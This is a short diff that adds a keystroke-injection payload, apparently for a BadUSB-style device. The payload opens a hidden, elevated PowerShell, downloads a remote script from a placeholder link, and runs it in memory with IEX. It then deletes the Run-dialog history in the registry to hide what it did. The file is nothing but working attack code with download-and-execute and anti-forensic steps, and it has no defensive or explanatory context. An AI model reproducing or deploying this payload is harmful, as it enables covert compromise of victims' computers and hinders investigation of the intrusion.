@@ -1,0 +1,4 @@
+DELAY 1500
+RUN WIN powershell -Verb runAs -W Hidden \"IEX (New-Object Net.WebClient).DownloadString('<link>');\"
+DELAY 1000
+RUN WIN powershell -WindowStyle Hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"
